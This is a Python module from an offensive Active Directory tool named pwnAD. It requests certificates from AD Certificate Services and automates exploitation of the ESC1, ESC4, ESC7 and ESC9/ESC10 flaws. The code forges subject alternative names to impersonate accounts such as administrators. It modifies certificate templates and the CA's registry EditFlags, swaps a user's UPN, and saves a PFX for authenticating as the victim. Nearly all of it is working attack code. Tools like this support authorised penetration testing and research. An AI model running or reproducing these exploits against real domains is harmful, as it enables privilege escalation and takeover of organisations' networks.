"""
ADCS Certificate Request module for pwnAD.

Requests certificates from Active Directory Certificate Services via
the MS-ICPR RPC interface (ICertPassage::CertServerRequest).
Supports ESC1 exploitation via Subject Alternative Name abuse.
"""
import logging

from impacket.dcerpc.v5 import transport, icpr
from impacket.dcerpc.v5.icpr import MSRPC_UUID_ICPR

from pwnAD.lib.certificate import (
    create_csr, create_pfx, csr_to_der, der_to_cert,
)


def _connect_to_ca(ca_host, auth_info):
    """Establish an RPC connection to the CA via \\pipe\\cert."""
    string_binding = rf'ncacn_np:{ca_host}[\pipe\cert]'
    rpc_transport = transport.DCERPCTransportFactory(string_binding)

    username = auth_info.get('username', '')
    password = auth_info.get('password', '')
    domain = auth_info.get('domain', '')
    lmhash = auth_info.get('lmhash', '')
    nthash = auth_info.get('nthash', '')
    aes_key = auth_info.get('aesKey', '')
    do_kerberos = auth_info.get('doKerberos', False)
    kdc_host = auth_info.get('kdcHost', None)

    rpc_transport.set_credentials(username, password, domain, lmhash, nthash, aes_key)
    if do_kerberos:
        rpc_transport.set_kerberos(True, kdcHost=kdc_host)

    dce = rpc_transport.get_dce_rpc()
    dce.connect()
    dce.bind(MSRPC_UUID_ICPR)
    return dce


def _build_attributes(template, upn=None, dns=None, sid=None):
    """Build the attribute list for the cert request."""
    attrs = [f'CertificateTemplate:{template}']
    san_parts = []
    if upn:
        san_parts.append(f'upn={upn}')
    if dns:
        san_parts.append(f'dns={dns}')
    if sid:
        san_parts.append(f'url=tag:microsoft.com,2022-09-14:sid:{sid}')
    if san_parts:
        attrs.append('SAN:' + '&'.join(san_parts))
    return attrs


def request_certificate(
    conn,
    ca_name,
    template,
    ca_host=None,
    upn=None,
    dns=None,
    sid=None,
    subject=None,
    key_size=2048,
    output=None,
):
    """Request a certificate from an ADCS CA.

    Args:
        conn: LDAPConnection with valid credentials
        ca_name: Common name of the Certificate Authority
        template: Certificate template name
        ca_host: CA hostname (auto-resolved from LDAP if None)
        upn: UPN for SAN (ESC1 — e.g. administrator@domain.local)
        dns: DNS name for SAN
        sid: SID for SAN (ESC1 with strong cert mapping)
        subject: Custom subject DN (e.g. 'CN=Administrator')
        key_size: RSA key size (default 2048)
        output: Output path for .pfx (default: <user>.pfx)

    Returns:
        tuple: (pfx_path, cert, key) on success, raises on failure
    """
    from pwnAD.lib.adcs import get_enrollment_services, _extract_auth_info

    auth_info = _extract_auth_info(conn)
    if not auth_info:
        raise RuntimeError("Could not extract authentication info from connection")

    # Resolve CA hostname if not provided
    if not ca_host:
        cas = get_enrollment_services(conn, parse_sd=False)
        for ca in cas:
            if ca.name.lower() == ca_name.lower():
                ca_host = ca.dns_hostname
                break
        if not ca_host:
            raise RuntimeError(f"Could not find CA '{ca_name}' in LDAP. Use --ca-host to specify manually.")

    logging.info(f"[*] Connecting to CA '{ca_name}' on {ca_host}")

    # Generate key and CSR
    username = auth_info['username']
    csr, key = create_csr(
        username=username,
        alt_upn=upn.encode() if upn else None,
        alt_dns=dns.encode() if dns else None,
        alt_sid=sid if sid else None,
        key_size=key_size,
        subject=subject,
    )

    csr_der = csr_to_der(csr)

    # Build attributes
    attr_list = _build_attributes(template, upn=upn, dns=dns, sid=sid)
    logging.info(f"[*] Requesting certificate with template '{template}'")
    if upn:
        logging.info(f"[*] SAN UPN: {upn}")
    if dns:
        logging.info(f"[*] SAN DNS: {dns}")

    # Connect and send request
    dce = _connect_to_ca(ca_host, auth_info)

    try:
        cert_der = icpr.hCertServerRequest(dce, csr_der, attr_list, ca=ca_name)
    finally:
        dce.disconnect()

    if not cert_der:
        raise RuntimeError("Certificate request denied by CA (check template name, enrollment rights, and CA approval settings)")

    cert = der_to_cert(cert_der)
    pfx = create_pfx(key, cert)

    if output is None:
        target_name = upn.split('@')[0] if upn else (dns or username)
        output = f'{target_name}.pfx'

    with open(output, 'wb') as f:
        f.write(pfx)

    logging.info(f"[+] Certificate issued! PFX saved to: {output}")
    logging.info(f"[*] Use with: pwnAD -pfx {output} ...")

    return output, cert, key


# =============================================================================
# ESC4 Exploitation — Modify template → request → restore
# =============================================================================

def exploit_esc4(
    conn, ca_name, template_name, target_upn,
    ca_host=None, key_size=2048, output=None,
):
    """Exploit ESC4: modify a writable template to enable SAN, request cert, restore.

    Requires WriteDACL/WriteOwner/GenericWrite/WriteProperty on the template.

    Args:
        conn: LDAPConnection
        ca_name: CA common name
        template_name: Template to modify
        target_upn: UPN to impersonate (e.g. administrator@domain.local)
        ca_host: CA hostname (auto-resolved if None)
        key_size: RSA key size
        output: Output PFX path

    Returns:
        tuple: (pfx_path, cert, key)
    """
    if getattr(conn, '_is_relayed', False):
        raise RuntimeError("ESC4 requires RPC credentials for cert request - not available on relayed connections")

    from ldap3 import MODIFY_REPLACE, BASE
    from pwnAD.lib.adcs import (
        CertificateNameFlag, EnrollmentFlag,
        EKU_CLIENT_AUTHENTICATION,
    )

    config_path = conn.configuration_path
    template_dn = f"CN={template_name},CN=Certificate Templates,CN=Public Key Services,CN=Services,{config_path}"

    # Read current template attributes
    conn._ldap_connection.search(
        search_base=template_dn,
        search_filter='(objectClass=*)',
        search_scope=BASE,
        attributes=[
            'msPKI-Certificate-Name-Flag', 'msPKI-Enrollment-Flag',
            'pKIExtendedKeyUsage', 'msPKI-RA-Signature',
        ],
    )
    if not conn._ldap_connection.entries:
        raise RuntimeError(f"Template '{template_name}' not found")

    entry = conn._ldap_connection.entries[0]
    attrs = entry.entry_attributes_as_dict

    orig_name_flag = int(attrs.get('msPKI-Certificate-Name-Flag', [0])[0])
    orig_enrollment_flag = int(attrs.get('msPKI-Enrollment-Flag', [0])[0])
    orig_ekus = list(attrs.get('pKIExtendedKeyUsage', []))
    orig_ra_sig = int(attrs.get('msPKI-RA-Signature', [0])[0])

    # Set flags for ESC1 exploitation
    new_name_flag = orig_name_flag | CertificateNameFlag.ENROLLEE_SUPPLIES_SUBJECT
    new_enrollment_flag = orig_enrollment_flag & ~EnrollmentFlag.PEND_ALL_REQUESTS
    new_ekus = list(set(orig_ekus + [EKU_CLIENT_AUTHENTICATION]))

    logging.info(f"[*] ESC4: Modifying template '{template_name}'")

    modifications = {
        'msPKI-Certificate-Name-Flag': [(MODIFY_REPLACE, [str(new_name_flag)])],
        'msPKI-Enrollment-Flag': [(MODIFY_REPLACE, [str(new_enrollment_flag)])],
        'pKIExtendedKeyUsage': [(MODIFY_REPLACE, new_ekus)],
        'msPKI-RA-Signature': [(MODIFY_REPLACE, ['0'])],
    }

    try:
        conn._ldap_connection.modify(template_dn, modifications)
        if not conn._ldap_connection.result['result'] == 0:
            raise RuntimeError(f"Failed to modify template: {conn._ldap_connection.result['description']}")

        logging.info("[+] Template modified (ENROLLEE_SUPPLIES_SUBJECT + Client Auth)")

        # Request the certificate
        result = request_certificate(
            conn, ca_name=ca_name, template=template_name,
            ca_host=ca_host, upn=target_upn,
            key_size=key_size, output=output,
        )
        return result

    finally:
        # Restore original attributes
        logging.info("[*] ESC4: Restoring original template attributes")
        restore = {
            'msPKI-Certificate-Name-Flag': [(MODIFY_REPLACE, [str(orig_name_flag)])],
            'msPKI-Enrollment-Flag': [(MODIFY_REPLACE, [str(orig_enrollment_flag)])],
            'pKIExtendedKeyUsage': [(MODIFY_REPLACE, orig_ekus if orig_ekus else [])],
            'msPKI-RA-Signature': [(MODIFY_REPLACE, [str(orig_ra_sig)])],
        }
        try:
            conn._ldap_connection.modify(template_dn, restore)
            if conn._ldap_connection.result['result'] == 0:
                logging.info("[+] Template restored to original state")
            else:
                logging.error(f"[!] Failed to restore template: {conn._ldap_connection.result['description']}")
        except Exception as e:
            logging.error(f"[!] Failed to restore template: {e}")


# =============================================================================
# ESC7 Exploitation — Enable EDITF_ATTRIBUTESUBJECTALTNAME2 via RRP
# =============================================================================

def exploit_esc7_manage_ca(
    conn, ca_name, template_name=None, target_upn=None,
    ca_host=None, key_size=2048, output=None, restore=True,
):
    """Exploit ESC7 (ManageCA): enable EDITF_ATTRIBUTESUBJECTALTNAME2, then request cert.

    Requires ManageCA permission on the CA.

    Args:
        conn: LDAPConnection
        ca_name: CA common name
        template_name: Template to use (auto-detected if None: first enrollable with Client Auth)
        target_upn: UPN to impersonate
        ca_host: CA hostname (auto-resolved if None)
        key_size: RSA key size
        output: Output PFX path
        restore: Restore original EditFlags after exploitation

    Returns:
        tuple: (pfx_path, cert, key)
    """
    if getattr(conn, '_is_relayed', False):
        raise RuntimeError("ESC7 requires RPC credentials for registry and cert request - not available on relayed connections")

    from pwnAD.lib.adcs import (
        get_enrollment_services, _extract_auth_info, get_certificate_templates,
        get_user_sids, EDITF_ATTRIBUTESUBJECTALTNAME2,
    )

    auth_info = _extract_auth_info(conn)
    if not auth_info:
        raise RuntimeError("Could not extract authentication info")

    # Resolve CA hostname
    if not ca_host:
        cas = get_enrollment_services(conn, parse_sd=False)
        for ca in cas:
            if ca.name.lower() == ca_name.lower():
                ca_host = ca.dns_hostname
                break
        if not ca_host:
            raise RuntimeError(f"Could not find CA '{ca_name}'")

    # Auto-detect template if not specified
    if not template_name:
        user_sids = get_user_sids(conn)
        templates = get_certificate_templates(conn, parse_sd=True, user_sids=user_sids)
        cas_objs = get_enrollment_services(conn, parse_sd=False)
        ca_templates = []
        for ca_obj in cas_objs:
            if ca_obj.name.lower() == ca_name.lower():
                ca_templates = ca_obj.certificate_templates
                break

        for t in templates:
            if t._can_enroll and t.client_authentication and t.name in ca_templates:
                template_name = t.name
                logging.info(f"[*] Auto-selected template: {template_name}")
                break

        if not template_name:
            raise RuntimeError("No enrollable template with Client Auth found on this CA")

    # Connect to registry and modify EditFlags
    from impacket.dcerpc.v5 import transport as rpc_transport, rrp
    stringbinding = f'ncacn_np:{ca_host}[\\pipe\\winreg]'
    rpctransport = rpc_transport.DCERPCTransportFactory(stringbinding)
    rpctransport.set_credentials(
        auth_info['username'], auth_info['password'], auth_info['domain'],
        auth_info['lmhash'], auth_info['nthash'], auth_info['aesKey'],
    )
    if auth_info.get('doKerberos'):
        rpctransport.set_kerberos(True, kdcHost=auth_info.get('kdcHost'))

    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(rrp.MSRPC_UUID_RRP)

    try:
        resp = rrp.hOpenLocalMachine(dce)
        hRoot = resp['phKey']

        ca_config_path = f'SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\{ca_name}'
        resp_key = rrp.hBaseRegOpenKey(dce, hRoot, ca_config_path)
        hKey = resp_key['phkResult']

        # Read current EditFlags
        try:
            val = rrp.hBaseRegQueryValue(dce, hKey, 'EditFlags')
            orig_flags = val[1]
            if isinstance(orig_flags, bytes):
                orig_flags = int.from_bytes(orig_flags[:4], 'little')
        except Exception:
            orig_flags = 0

        if orig_flags & EDITF_ATTRIBUTESUBJECTALTNAME2:
            logging.info("[*] EDITF_ATTRIBUTESUBJECTALTNAME2 already enabled")
        else:
            new_flags = orig_flags | EDITF_ATTRIBUTESUBJECTALTNAME2
            logging.info("[*] ESC7: Enabling EDITF_ATTRIBUTESUBJECTALTNAME2")
            rrp.hBaseRegSetValue(
                dce, hKey, 'EditFlags',
                rrp.REG_DWORD, new_flags.to_bytes(4, 'little'),
            )
            logging.info("[+] EditFlags updated")

        rrp.hBaseRegCloseKey(dce, hKey)
        rrp.hBaseRegCloseKey(dce, hRoot)
    finally:
        dce.disconnect()

    # Now request the cert (ESC6 path — SAN on any template)
    try:
        result = request_certificate(
            conn, ca_name=ca_name, template=template_name,
            ca_host=ca_host, upn=target_upn,
            key_size=key_size, output=output,
        )
        return result
    finally:
        if restore and not (orig_flags & EDITF_ATTRIBUTESUBJECTALTNAME2):
            logging.info("[*] ESC7: Restoring original EditFlags")
            try:
                dce2 = rpctransport.get_dce_rpc()
                dce2.connect()
                dce2.bind(rrp.MSRPC_UUID_RRP)
                resp = rrp.hOpenLocalMachine(dce2)
                hRoot = resp['phKey']
                resp_key = rrp.hBaseRegOpenKey(dce2, hRoot, ca_config_path)
                hKey = resp_key['phkResult']
                rrp.hBaseRegSetValue(
                    dce2, hKey, 'EditFlags',
                    rrp.REG_DWORD, orig_flags.to_bytes(4, 'little'),
                )
                rrp.hBaseRegCloseKey(dce2, hKey)
                rrp.hBaseRegCloseKey(dce2, hRoot)
                dce2.disconnect()
                logging.info("[+] EditFlags restored")
            except Exception as e:
                logging.error(f"[!] Failed to restore EditFlags: {e}")


# =============================================================================
# ESC9/ESC10 Exploitation — UPN swap → request cert → restore
# =============================================================================

def exploit_esc9(
    conn, target_sam, ca_name, template_name, impersonate_upn,
    ca_host=None, key_size=2048, output=None,
):
    """Exploit ESC9/ESC10: modify target's UPN, request cert, restore.

    Requires GenericWrite/WriteProperty on the target account.
    Template must have NO_SECURITY_EXTENSION (ESC9) or domain must have
    weak cert mapping (ESC10).

    Args:
        conn: LDAPConnection
        target_sam: sAMAccountName of the account to modify (that you have write access to)
        ca_name: CA common name
        template_name: Template name (must have NO_SECURITY_EXTENSION for ESC9)
        impersonate_upn: UPN of the account to impersonate (e.g. administrator@domain.local)
        ca_host: CA hostname
        key_size: RSA key size
        output: Output PFX path

    Returns:
        tuple: (pfx_path, cert, key)
    """
    if getattr(conn, '_is_relayed', False):
        raise RuntimeError("ESC9 requires RPC credentials for cert request - not available on relayed connections")

    from ldap3 import MODIFY_REPLACE, SUBTREE
    from ldap3.utils.conv import escape_filter_chars as esc

    # Find the target DN and current UPN
    conn._ldap_connection.search(
        search_base=conn._baseDN,
        search_filter=f"(sAMAccountName={esc(target_sam)})",
        search_scope=SUBTREE,
        attributes=['distinguishedName', 'userPrincipalName'],
    )
    if not conn._ldap_connection.entries:
        raise RuntimeError(f"Account '{target_sam}' not found")

    entry = conn._ldap_connection.entries[0]
    target_dn = entry.entry_dn
    orig_upn = entry.entry_attributes_as_dict.get('userPrincipalName', [''])[0]

    logging.info(f"[*] ESC9: Target {target_sam} (current UPN: {orig_upn or '<none>'})")
    logging.info(f"[*] ESC9: Setting UPN to {impersonate_upn}")

    # Set UPN to the impersonation target
    conn._ldap_connection.modify(target_dn, {
        'userPrincipalName': [(MODIFY_REPLACE, [impersonate_upn])],
    })
    if conn._ldap_connection.result['result'] != 0:
        raise RuntimeError(f"Failed to modify UPN: {conn._ldap_connection.result['description']}")

    logging.info("[+] UPN modified")

    try:
        # Request certificate as the target (cert maps via UPN, no SID extension)
        result = request_certificate(
            conn, ca_name=ca_name, template=template_name,
            ca_host=ca_host, key_size=key_size, output=output,
        )
        return result

    finally:
        # Restore original UPN
        logging.info("[*] ESC9: Restoring original UPN")
        restore_val = [orig_upn] if orig_upn else []
        try:
            conn._ldap_connection.modify(target_dn, {
                'userPrincipalName': [(MODIFY_REPLACE, restore_val)],
            })
            if conn._ldap_connection.result['result'] == 0:
                logging.info("[+] UPN restored")
            else:
                logging.error(f"[!] Failed to restore UPN: {conn._ldap_connection.result['description']}")
        except Exception as e:
            logging.error(f"[!] Failed to restore UPN: {e}")
